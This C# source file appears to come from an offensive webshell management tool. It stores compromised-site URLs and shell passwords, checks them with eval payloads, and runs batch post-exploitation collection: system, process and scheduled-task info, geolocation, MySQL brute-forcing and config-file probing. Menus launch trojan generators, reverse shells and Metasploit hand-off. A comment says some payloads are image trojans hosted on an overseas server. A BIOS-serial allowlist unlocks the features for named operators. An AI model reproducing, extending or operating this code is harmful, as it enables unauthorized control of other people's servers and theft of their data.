using C2.Business.CastleBravo.WebShellTool.SettingsDialog;
using C2.Core;
using C2.Utils;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;
using static C2.Utils.GuarderUtil;

namespace C2.Business.CastleBravo.WebShellTool
{
    public partial class WebShellManageForm : Form
    {
        public static ProxySetting Proxy { get; set; } = ProxySetting.Empty;
        private int NumberOfAlive { get; set; }
        private int NumberOfHost { get => setOfHost.Count; }
        private int NumberOfIPAddress { get => setOfIPAddress.Count; }

        private HashSet<string> setOfIPAddress;
        private HashSet<string> setOfHost;

        List<WebShellTaskConfig> tasks = new List<WebShellTaskConfig>();
        readonly string configFFP = Path.Combine(Application.StartupPath, "Resources", "WebShellConfig", "config.db");

        private ToolStripItem[] enableItems;
        private DateTime s; // 自动保存
        private SGType sgType;
        readonly List<string> threeGroupBios = new List<string>(){
            "L1HF58S04Y6",    // LQ
            "L1HF68F046A",    // SQY
            "PF2Z4F9W",       // HZH
            "L1HF68F02VM",    // MHD
            "L1HF5AL00EV",    // LXF
            "L1HF68F04XB",    // WLY
            "/7KFL4S2/CNWS20088P013N/" ,   // XX
            "/7W9Q8M2/CNWS2007A500S5/" };  // WL
        //

        private FindSet finder;

        public WebShellManageForm()
        {
            InitializeComponent();
            InitializeToolStrip();
            InitializeOther();
            InitializeLock();
        }

        private void ResetSLabel()
        {
            ItemCountSLabel.Text = string.Format("共{0}项", LV.Items.Count);
            ProxyEnableSLabel.Text = "代理" + (Proxy.Enable ? "启用" : "关闭");
        }
        private void InitializeOther()
        {
            setOfHost = new HashSet<string>();
            setOfIPAddress = new HashSet<string>();
            NumberOfAlive = 0;
            finder = new FindSet(LV);
            LV.ListViewItemSorter = new LVComparer();
        }

        private void InitializeToolStrip()
        {
            // 批量验活时, 与其他菜单项互斥
            enableItems = new ToolStripItem[]
            {
                this.editDDB,
                this.proxySettingMenu,
                this.refreshAllShellMenu,
                this.refreshOtherMenu2,
                this.secondRefreshMenu,
                this.checkAliveDDB,
                this.trojanMenu,
                this.infoCollectionMenu,
                this.passwdBlastingMenuItem,
                this.allTaskMysqlMenuItem,
                this.aliveTaskMysqlMenuItem
            };
        }
        private void InitializeLock()
        {
            if (IsLocked())
            {
                trojanMenu.Enabled = false;
                infoCollectionMenu.Enabled = false;
                refreshAllShellMenu.Enabled = false;
                secondRefreshMenu.Enabled = false;
                //右键菜单
                EnterToolStripMenuItem.Enabled = false;
                SuscideMenuItem.Enabled = false;
                CheckAliveSelectedItemMenuItem.Enabled = false;
                ReverseShellMenu.Enabled = false;
                msfMenu.Enabled = false;
                DDMenuItem.Enabled = false;
            }
        }
        private bool IsThreeGroup()
        {
            return threeGroupBios.Contains(ConfigUtil.GetBIOSSerialNumber());
        }

        private bool IsLocked()
        {
            if (IsThreeGroup() || File.Exists(ClientSetting.UnlockFilePath))
                UnlockButton.Enabled = false;
            return UnlockButton.Enabled;
        }
        
        public void FuctionUnlock()
        {
            trojanMenu.Enabled = true;
            infoCollectionMenu.Enabled = true;
            refreshAllShellMenu.Enabled = true;
            secondRefreshMenu.Enabled = true;
            //右键菜单
            EnterToolStripMenuItem.Enabled = true;
            SuscideMenuItem.Enabled = true;
            CheckAliveSelectedItemMenuItem.Enabled = true;
            ReverseShellMenu.Enabled = true;
            msfMenu.Enabled = true;
            DDMenuItem.Enabled = true;
            UnlockButton.Enabled = false;//按钮不可用
        }

        private void 添加ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            WebShellTaskConfig config = new AddWebShellForm().ShowDialog(ST.NowString());
            if (config == WebShellTaskConfig.Empty)
                return;

            LV.Items.Add(NewLVI(config));
            tasks.Add(config);
            SaveDB();
        }

        private void 批量添加ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            AddAllWebShellForm dialog = new AddAllWebShellForm();
            if (dialog.ShowDialog() != DialogResult.OK)
                return;

            // 修复添加6万左右数据卡死的问题
            using (GuarderUtil.WaitCursor)
                LV.Items.AddRange(NewLVIS(dialog.Tasks));
            tasks.AddRange(dialog.Tasks);
            SaveDB();
        }

        private void RefreshTasks(bool create = true)
        {
            tasks.Clear();
            foreach (ListViewItem lvi in LV.Items)
            {
                WebShellTaskConfig config = create ? new WebShellTaskConfig(GetSubItemsTextArray(lvi)) : 
                    lvi.Tag as WebShellTaskConfig;
                // 针对删除菜单的优化,删除先置Empty后删除  
                if (config != WebShellTaskConfig.Empty)
                {
                    lvi.Tag = config; // 关联
                    tasks.Add(config);
                }         
            }
        }

        private string[] GetSubItemsTextArray(ListViewItem lvi)
        {
            List<string> array = new List<string>(lvi.SubItems.Count);
            for (int i = 0; i < lvi.SubItems.Count; i++)
                array.Add(lvi.SubItems[i].Text);
            return array.ToArray();
        }

        private void ClearAll()
        {
            tasks.Clear();
            RefreshLV();
            SaveDB();
        }

        private void SaveDB()
        {
            ResetSLabel();
            StaticItems();
            try
            {
                using (Stream stream = File.Open(configFFP, FileMode.Create))
                    new BinaryFormatter().Serialize(stream, tasks);
            }
            catch { }
        }

        private void WebShellManageForm_Load(object sender, EventArgs e)
        {
            LoadDB();
            RefreshLV();
            ResetSLabel();
            StaticItems();
        }

        private void LoadDB()
        {
            try
            {
                using (Stream stream = File.Open(configFFP, FileMode.Open))
                    tasks = new BinaryFormatter().Deserialize(stream) as List<WebShellTaskConfig>;
            }
            catch { }
        }

        private void RefreshLV()
        {
            LV.Items.Clear();  // 不能删表头的clear方法
            using (GuarderUtil.WaitCursor)
                LV.Items.AddRange(NewLVIS(tasks));
        }

        private void RefreshBackColor()
        {
            foreach(ListViewItem lvi in LV.Items)
            {
                lvi.BackColor = isAlertnatingRows ? SingleRowColor : AltertnatingRowColor;
                isAlertnatingRows = !isAlertnatingRows;
            }
        }

        static bool isAlertnatingRows = true;
        static readonly Color SingleRowColor = Color.FromArgb(255, 217, 225, 242);
        static readonly Color AltertnatingRowColor = Color.FromArgb(255, 208, 206, 206);
        private ListViewItem NewLVI(WebShellTaskConfig config)
        {
            ListViewItem lvi = new ListViewItem(config.CreateTime);
            lvi.SubItems.Add(config.Remark);
            lvi.SubItems.Add(config.Url);
            lvi.SubItems.Add(config.Password);
            lvi.SubItems.Add(config.TrojanType);
            lvi.SubItems.Add(config.Status);
            lvi.SubItems.Add(config.ClientVersion);
            lvi.SubItems.Add(config.ProbeInfo);
            lvi.SubItems.Add(config.IP);
            lvi.SubItems.Add(config.Country);
            lvi.SubItems.Add(config.Country2);
            lvi.SubItems.Add(config.DatabaseConfig);

            // 指针关联
            lvi.Tag = config;
            // 设置间隔行背景色
            lvi.BackColor = isAlertnatingRows ? SingleRowColor : AltertnatingRowColor;
            isAlertnatingRows = !isAlertnatingRows;
            return lvi;
        }

        private ListViewItem[] NewLVIS(IList<WebShellTaskConfig> tasks)
        {
            ListViewItem[] lvis = new ListViewItem[tasks.Count];
            for (int i = 0; i < lvis.Length; i++)
                lvis[i] = NewLVI(tasks[i]);
            return lvis;
        }

        private void EnterToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.LV.SelectedItems.Count == 0)
                return;

            new WebShellDetailsForm(LV.SelectedItems[0].Tag as WebShellTaskConfig).ShowDialog();
        }

        private void RemoveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem lvi in LV.SelectedItems)
                lvi.Tag = WebShellTaskConfig.Empty;

            RefreshTasks(false);
            using (WaitCursor)
                SaveDB();
            using (new LayoutGuarder(LV))
                foreach (ListViewItem lvi in LV.SelectedItems)
                    lvi.Remove();
        }

        private void EditToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.LV.SelectedItems.Count == 0)
                return;

            WebShellTaskConfig old = LV.SelectedItems[0].Tag as WebShellTaskConfig;
            WebShellTaskConfig cur = new AddWebShellForm().ShowDialog(old);

            if (cur == WebShellTaskConfig.Empty)
                return;

            LV.SelectedItems[0].Tag = cur;
            LV.SelectedItems[0].SubItems[1].Text = cur.Remark;         // 名称
            LV.SelectedItems[0].SubItems[2].Text = cur.Url;            // url
            LV.SelectedItems[0].SubItems[3].Text = cur.Password;       // 密码
            LV.SelectedItems[0].SubItems[4].Text = cur.TrojanType;     // 木马类型
            LV.SelectedItems[0].SubItems[5].Text = cur.Status;         // 木马状态
            LV.SelectedItems[0].SubItems[6].Text = cur.ClientVersion;  // 客户端版本
            LV.SelectedItems[0].SubItems[7].Text = cur.ProbeInfo;      // 后SG字段
            LV.SelectedItems[0].SubItems[8].Text = cur.IP;             // 目标IP
            LV.SelectedItems[0].SubItems[9].Text = cur.Country;        // 归属地
            LV.SelectedItems[0].SubItems[10].Text = cur.Country2;      // 归属地
            // 按道理不会出现索引越界
            tasks[tasks.IndexOf(old)] = cur;
            SaveDB();
        }
        private void LV_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            EditToolStripMenuItem_Click(sender, e);
        }

        private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            // 复制当前的选中单元格到粘贴板
            if (this.LV.SelectedItems.Count == 0)
                return;

            StringBuilder sb = new StringBuilder();
            foreach (ListViewItem lvi in this.LV.SelectedItems)
            {
                for (int i = 0; i < lvi.SubItems.Count; i++)
                    sb.Append(lvi.SubItems[i].Text).Append(OpUtil.TabSeparator);
                sb.TrimEndT().AppendLine();
            }
            FileUtil.TryClipboardSetText(sb.ToString());
        }


        private void TrojanGeneratorMenuItem_Click(object sender, EventArgs e)
        {
            string type = (sender as ToolStripMenuItem).ToolTipText.Split('|')[0];
            new TrojanGeneratorForm(type).ShowDialog();
        }

        private void GodzillaTrojanGeneratorMenuItem_Click(object sender, EventArgs e)
        {
            new TrojanGeneratorForm("哥斯拉配套Trojan", true).ShowDialog();
        }


        private void CheckAliveSelectedItemMenuItem_Click(object sender, EventArgs e)
        {
            this.checkAliveNeedStop = false;
            if (this.LV.SelectedItems.Count == 0)
                return;
            UpdateAliveItems(LV.SelectedItems[0]);
            RefreshTasks();
            SaveDB();
        }

        private void CheckAliveAllMenuItem_Click(object sender, EventArgs e)
        {
            DoCheckAliveAllMenuItemClick(false);
        }

        private bool checkAliveNeedStop = false;

        private void CheckAliveStopMenu_Click(object sender, EventArgs e)
        {
            checkAliveNeedStop = true;
        }

        private void SecondCheckAliveTaskStatus()
        {
            ResetProgressMenu();

            foreach (ListViewItem lvi in LV.Items)
            {   // 没启用跳过尸体, 清空 或 死状态 清空
                if (lvi.SubItems[5].Text.In(new string[] { "×", "待" }))
                    lvi.SubItems[5].Text = "待";
                else
                    this.progressBar.Maximum--;
            }
            CheckAliveAll(true, false);
            EndCheckAlive();
        }

        private void DoCheckAliveAllMenuItemClick(bool safeMode)
        {   // 刷新前先强制清空
            ResetProgressMenu();

            foreach (ListViewItem lvi in LV.Items)
                ClearAliveSubItems(lvi);

            CheckAliveAll(false, safeMode);
            EndCheckAlive();
        }

        private void CheckAliveAll(bool skipAlive, bool safeMode)
        {
            s = DateTime.Now;
            using (new ControlEnableGuarder(this.contextMenuStrip))
            using (new ToolStripItemEnableGuarder(this.enableItems))
            foreach (ListViewItem lvi in LV.Items)
            {
                if (checkAliveNeedStop)
                    break;
                // 启用二刷
                if (skipAlive && lvi.SubItems[5].Text != "待")
                    continue;
                UpdateAliveItems(lvi, safeMode);
                UpdateProgress();
                CheckSavePoint(); // 5分钟保存一次
            }
            InitializeLock();//验活不影响功能加锁

        }

        private void EndCheckAlive()
        {
            RefreshTasks();
            SaveDB();
        }

        private void CheckSavePoint()
        {
            TimeSpan gap = DateTime.Now - s;
            if (gap.TotalMinutes >= 5)
            {   // 5分钟保存一次
                RefreshTasks();
                SaveDB();
                s = DateTime.Now;
            }
        }

        private void ResetProgressMenu(bool checkAlive = false)
        {
            this.progressMenu.Text = string.Empty;
            this.progressBar.Value = 0;
            this.progressBar.Maximum = checkAlive ? CountAliveItem() : LV.Items.Count;
            this.checkAliveNeedStop = false;
            this.NumberOfAlive = 0;
            this.setOfIPAddress.Clear();
            this.setOfHost.Clear();
        }

        private int CountAliveItem()
        {
            int sum = 0;
            foreach (ListViewItem lvi in LV.Items)
                if (lvi.SubItems[5].Text == "√")
                    sum++;
            return sum;
        }

        private void UpdateAliveItems(ListViewItem lvi, bool safeMode = false)
        {
            WebShellTaskConfig task = lvi.Tag as WebShellTaskConfig;
            string rts = CheckAliveOneTask(task, safeMode);

            if (rts == "√")
            {
                this.NumberOfAlive++;
                this.setOfHost.Add(NetUtil.GetHostByUrl(task.Url));
                this.setOfIPAddress.Add(task.IP);
            }
            lvi.SubItems[5].Text = rts;
            lvi.SubItems[8].Text = task.IP;
            lvi.SubItems[9].Text = task.Country;
            lvi.SubItems[10].Text = task.Country2;
            lvi.ListView.RedrawItems(lvi.Index, lvi.Index, false);
        }
        private void UpdateProgress()
        {
            this.progressMenu.Text = string.Format("{0}/{1} {5} - 活 {2} - 站 {3} - IP {4}",
                ++progressBar.Value,
                progressBar.Maximum,
                NumberOfAlive,
                NumberOfHost,
                NumberOfIPAddress,
                progressBar.Value == progressBar.Maximum ? "完成" : string.Empty);
        }

        private static void ClearAliveSubItems(ListViewItem lvi)
        {
            lvi.SubItems[5].Text = string.Empty;
            lvi.SubItems[8].Text = string.Empty;
            lvi.SubItems[9].Text = string.Empty;
            lvi.SubItems[10].Text = string.Empty;
        }

        private string CheckAliveOneTask(WebShellTaskConfig task, bool safeMode)
        {
            string status = "×";
            using (GuarderUtil.WaitCursor)
            {
                // safe模式下 跳过国内网站
                bool isChina = RefreshIPAddress(task);
                if (safeMode && isChina)
                    return "跳";

                // 我总结的print穿透WAF大法
                if (PostCheckAlive(task))
                    return "√";
            }
            return status;
        }

        private bool PostCheckAlive(WebShellTaskConfig task)
        {   // WebClient的超时是响应超时, 但有时候网页会有响应,但加载慢, 需要整体超时控制
            return DoEventsWait(5, Task.Run(() => CheckAlive(task)));
        }


        private static bool DoEventsWait(int timeout, Task<bool> t)
        {
            // 代理慢, timeout富裕一些
            timeout = Proxy == ProxySetting.Empty ? timeout : timeout * 2;
            int start = Environment.TickCount;

            while (Math.Abs(Environment.TickCount - start) < timeout * 1000)
            {
                Application.DoEvents();
                if (t.Wait(1000))
                    return t.Result;
            }
            return false;
        }

        private bool RefreshIPAddress(WebShellTaskConfig task)
        {
            // 二刷时直接利用上次IP结果,加速
            if (task.Status != "待")
            {
                Application.DoEvents();
                task.IP = NetUtil.GetHostAddresses(task.Url);
                Application.DoEvents();
                task.Country = NetUtil.IPQuery_WhoIs(task.IP);
                Application.DoEvents();
                task.Country2 = NetUtil.IPQuery_ChunZhen(task.IP);
                Application.DoEvents();
            }

            return NetUtil.IsChina(task.Country) || NetUtil.IsChina(task.Country2);
        }

        private bool CheckAlive(WebShellTaskConfig task)
        {
            try
            {
                string url = NetUtil.FormatUrl(task.Url);
                string pass = task.Password;
                string seed = RandomUtil.RandomInt(31415000, 31415926).ToString();
                string php = string.Format("=print({0});", seed);
                string asp = string.Format("=response.write({0})", seed);
                // 默认按php算
                string payload = task.TrojanType == "phpEval" ? php :
                                 task.TrojanType == "aspEval" ? asp :
                                 php;

                string result = WebClientEx.Post(url, pass + payload, 1500, Proxy);
                return result.Contains(seed);
            }
            catch { return false; }

        }

        private void ClearAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ClearAll();
        }

        private void SuscideMenuItem_Click(object sender, EventArgs e)
        {
            if (this.LV.SelectedItems.Count == 0)
                return;

            WebShellTaskConfig config = LV.SelectedItems[0].Tag as WebShellTaskConfig;
            WebShellClient client = new WebShellClient(config.Url, config.Password, config.ClientVersion, config.DatabaseConfig);
            client.Suscide();
            RemoveToolStripMenuItem_Click(sender, e);
        }

        private void ProxyMenu_Click(object sender, EventArgs e)
        {
            Proxy = new ProxySettingForm(Proxy).ShowDialog();
            ResetSLabel();
        }

        private void SaveResultsMenuItem_Click(object sender, EventArgs e)
        {
            SaveFileDialog dialog = new SaveFileDialog();
            dialog.Filter = "BCP文件|*.bcp";
            dialog.FileName = "D洞管理" + DateTime.Now.ToString("yyyyMMddHHmm") + ".bcp";

            if (dialog.ShowDialog() != DialogResult.OK)
                return;

            using (GuarderUtil.WaitCursor)
                SaveResultToLocal(dialog.FileName);
        }

        private void SaveResultToLocal(string path)
        {
            StreamWriter sw = new StreamWriter(path, false);
            try
            {
                List<string> tmpLists = new List<string>();
                foreach (ListViewItem lvi in LV.Items)
                {
                    tmpLists.Clear();
                    for (int i = 0; i < lvi.SubItems.Count; i++)
                        tmpLists.Add(lvi.SubItems[i].Text.Replace("\r\n", " "));
                    sw.WriteLine(string.Join("\t", tmpLists.ToArray()));
                }
            }
            catch { }
            finally
            {
                if (sw != null)
                    sw.Close();
            }
        }

        private void SecondeCheckAliveMenu_Click(object sender, EventArgs e)
        {
            SecondCheckAliveTaskStatus();
        }

        private void RefreshOtherMenu_Click(object sender, EventArgs e)
        {
            DoCheckAliveAllMenuItemClick(true);
        }

        private void WebShellManageForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            this.checkAliveNeedStop = true;
            using (GuarderUtil.WaitCursor)
            {
                RefreshTasks();
                SaveDB();
            }
        }

        private void StaticItems()
        {
            int dead = 0;
            int alive = 0;

            foreach (ListViewItem lvi in LV.Items)
            {
                switch (lvi.SubItems[5].Text)
                {
                    case "√":
                        alive++;
                        break;
                    case "×":
                        dead++;
                        break;
                }
            }
            StatusLabel.Text = string.Format("活 {0} - 死 {1}", alive, dead);
        }

        private void ClearScanResult()
        {
            foreach (ListViewItem lvi in LV.Items)
                lvi.SubItems[7].Text = string.Empty;
        }

        #region 后信息收集模块,该模块部分payload是存储在境外服务器103.43.17.9上的图片马
        // mysql部分
        private void AllTaskMysqlMenuItem_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.MysqlBlasting;
            BatchInfoColletion(false);
        }
        private void AliveTaskMysqlMenuItem_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.MysqlBlasting;
            BatchInfoColletion(true);
        }
 
        private void MysqlTaskSetMenuItem_Click(object sender, EventArgs e)
        {
            new MysqlBlastingSet().ShowDialog();
        }
        //系统信息
        private void AllSysInfoMenuItem_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.SystemInfo;
            BatchInfoColletion(false);
        }
        private void AliveSysInfoMenuItem_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.SystemInfo;
            BatchInfoColletion(true);
        }

        // 进程信息
        private void AllProcessView_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.ProcessView;
            BatchInfoColletion(false);
        }

        private void AliveProcessView_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.ProcessView;
            BatchInfoColletion(true);
        }

        private void CurrentProcessView_Click(object sender, EventArgs e)
        {


        }
        // 定时任务
        private void AllScheduleTask_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.ScheduleTask;
            BatchInfoColletion(false);
        }

        private void AliveScheduleTask_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.ScheduleTask;
            BatchInfoColletion(true);
        }

        // 地理位置部分
        private void AllLocationInfoMenuItem_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.LocationInfo;
            BatchInfoColletion(false);
        }
        private void AliveLocationInfo_Click(object sender, EventArgs e)
        {

            this.sgType = SGType.LocationInfo;
            BatchInfoColletion(true);
        }

        private void DoCurrentItemTask()
        {
            this.checkAliveNeedStop = false;
            foreach (ListViewItem item in this.LV.SelectedItems)
            {
                if (checkAliveNeedStop)
                    break;
                SingleInfoCollection(item);
            }
        }

        //公共函数部分
        private void BatchInfoColletion(bool checkAlive)
        {   // 刷新前先强制清空
            ResetProgressMenu(checkAlive);
            ClearScanResult();
            DoInfoCollectionTask(checkAlive);
            EndCheckAlive();
        }
        private void DoInfoCollectionTask(bool checkAlive)
        {
            s = DateTime.Now;
            using (new ControlEnableGuarder(this.contextMenuStrip))
            using (new ToolStripItemEnableGuarder(this.enableItems))
                foreach (ListViewItem lvi in LV.Items)
                {
                    if (checkAliveNeedStop)
                        break;
                    if (checkAlive && !lvi.SubItems[5].Text.Equals("√"))
                    {
                        lvi.SubItems[7].Text = "跳";
                        continue;
                    }
                    SingleInfoCollection(lvi);
                    UpdateProgress();
                    CheckSavePoint(); // 5分钟保存一次
                }
        }
        private void SingleInfoCollection(ListViewItem lvi,int time = 90)
        {
            WebShellTaskConfig task = lvi.Tag as WebShellTaskConfig;
            lvi.SubItems[7].Text = "进行中";
            using (GuarderUtil.WaitCursor)
                DoEventsWait(time, Task.Run(() => PostInfoCollectionPayload(task)));
            lvi.SubItems[7].Text = task.ProbeInfo;
        }
        private bool PostInfoCollectionPayload(WebShellTaskConfig task)
        {
            try
            {
                string payload = string.Format(ClientSetting.PayloadDict[this.sgType], task.Password);
                if (this.sgType == SGType.UserTable)
                {
                    byte[] ret = WebClientEx.PostDownload(NetUtil.FormatUrl(task.Url), payload, 80000, Proxy);
                    task.ProbeInfo = ClientSetting.ProcessingResults(ret, task.Url, ClientSetting.InfoProbeItems[this.sgType]);
                }
                else
                {
                    string ret = WebClientEx.Post(NetUtil.FormatUrl(task.Url), payload, 80000, Proxy);
                    task.ProbeInfo = ProcessingResults(ret, task.Url);
                }

            }
            catch (Exception ex)
            {
                task.ProbeInfo = ex.Message;
            }
            return true;
        }
        
        private String ProcessingResults(string ret, string taskUrl)
        {
            Regex r0 = new Regex("QACKL3IO9P==(.+?)==QACKL3IO9P", RegexOptions.Singleline);
            Match m0 = r0.Match(ret);
            if (!m0.Success)
                return ClientSetting.InfoProbeItems[this.sgType] + ":无结果";

            string rawResult = m0.Groups[1].Value;
            if (this.sgType == SGType.LocationInfo)
                return LocationResult(rawResult);

            if (ClientSetting.table.ContainsKey(this.sgType)) //进程 计划任务 系统信息……
                return ClientSetting.WriteResult(rawResult, taskUrl, ClientSetting.table[this.sgType]);
         
            return rawResult;
        }
       
        private string LocationResult(string rawResult)
        {
            Regex r = new Regex("formatted_address\":\"(.+),\"business");
            int index = new Random().Next(0, ClientSetting.BDLocationAK.Count - 1);
            string bdURL = string.Format(ClientSetting.BDLocationAPI, ClientSetting.BDLocationAK[index], rawResult);
            string jsonResult = ST.EncodeUTF8(WebClientEx.Post(bdURL, string.Empty, 10000, Proxy));
            Match m = r.Match(jsonResult);
            return m.Success ? rawResult + ":" + m.Groups[1].Value : string.Empty;
        }
        // msf部分
        private void MSFMenu_Click(object sender, EventArgs e)
        {
            if (this.LV.SelectedItems.Count == 0)
                return;
            DialogResult dialogResult = new MSFSet(LV.SelectedItems[0].Tag as WebShellTaskConfig, Proxy).ShowDialog();
            if (dialogResult.Equals(DialogResult.OK))
                this.infoConfigStatus.Text = DateTime.Now + ": MSF联动已发起";
        }

        private void ReverseShellMenu_Click(object sender, EventArgs e)
        {
            if (this.LV.SelectedItems.Count == 0)
                return;
            DialogResult dialogResult = new ReverseShellSet(LV.SelectedItems[0].Tag as WebShellTaskConfig, Proxy).ShowDialog();
            if (dialogResult.Equals(DialogResult.OK))
                this.infoConfigStatus.Text = DateTime.Now + ": 反弹Shell已发起";
        }


        private void LV_MouseClick(object sender, MouseEventArgs e)
        {
            this.LV.ContextMenuStrip = this.contextMenuStrip;

            if (e.Button != MouseButtons.Right || e.Clicks != 1 || LV.SelectedItems.Count == 0)
                return;

            ListViewItem item = LV.SelectedItems[0];
            ListViewItem.ListViewSubItem subItem = item.GetSubItemAt(e.X, e.Y);

            if (subItem == null || item.SubItems.IndexOf(subItem) != 7)
                return;

            if (!subItem.Text.StartsWith(Path.Combine(Global.UserWorkspacePath, "后信息采集")))
                return;

            this.LV.ContextMenuStrip = this.contextMenuStrip1;

        }
        private void OpenFileMenuItem_Click(object sender, EventArgs e)
        {
            ProcessUtil.ProcessOpen(CurrentFilePath());
        }

        private void OpenDirMenuItem_Click(object sender, EventArgs e)
        {
            FileUtil.ExploreDirectory(CurrentFilePath());
        }

        private void CopyDirMenuItem_Click(object sender, EventArgs e)
        {
            FileUtil.TryClipboardSetText(CurrentFilePath());
        }
        private string CurrentFilePath()
        {
            return LV.SelectedItems[0].SubItems[7].Text;
        }
        #endregion

        private void UnlockButton_Click(object sender, EventArgs e)
        {
            if (new FunctionUnlockForm().ShowDialog() == DialogResult.OK)
                FuctionUnlock();
        }

        private void 查找ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            finder.FindHit();
        }

        private void LV_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            LVComparer c = LV.ListViewItemSorter as LVComparer;
            c.col = e.Column;
            c.asce = !c.asce;
            using(WaitCursor)
            using (new LayoutGuarder(LV))
            {
                LV.Sort();
                RefreshTasks(false); // 回写任务, 速度慢, 将来要优化
                RefreshBackColor();  // 重新布局
            }
                
        }

        private void SuperPingMenuItem_Click(object sender, EventArgs e)
        {
            new SuperPingSet().ShowDialog();
        }

        private void 地理定位ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.LocationInfo;
            DoCurrentItemTask();
        }

        private void 定时任务ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.ScheduleTask;
            DoCurrentItemTask();
        }

        private void 进程列表ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.ProcessView;
            DoCurrentItemTask();
        }

        private void 系统信息ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.SystemInfo;
            DoCurrentItemTask();
        }

        private void MysqlBlastingToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.MysqlBlasting;
            DoCurrentItemTask();
        }

        private void 配置文件探针ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.LV.SelectedItems.Count == 0)
                return;

            MysqlProbeSet mps = new MysqlProbeSet();
            if (mps.ShowDialog() != DialogResult.OK)
                return;

            int ts = mps.TimeoutSeconds;
            int ps = mps.ProbeStrategy;
            string files = mps.SearchFiles.Trim();
            string fields = mps.SearchFields.Trim();

            this.sgType = SGType.MysqlProbe;
            string payload = string.Format(ClientSetting.MysqlProbePayload,
                "{0}",
                ps,
                ST.EncodeBase64(files),
                ST.EncodeBase64(fields));

            ClientSetting.PayloadDict[SGType.MysqlProbe] = payload;
            SingleInfoCollection(this.LV.SelectedItems[0], ts);
        }

        private void UserMYD探针ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.LV.SelectedItems.Count == 0)
                return;
            this.sgType = SGType.UserTable;
            UserMYDProbeSet utp = new UserMYDProbeSet();
            if (utp.ShowDialog() != DialogResult.OK)
                return;
            string payload = string.Format(ClientSetting.UserTablePayload,
                                         "{0}", utp.DBUser, utp.DBPassword);

            ClientSetting.PayloadDict[SGType.UserTable] = payload;
            SingleInfoCollection(this.LV.SelectedItems[0]);
        }

    }
}
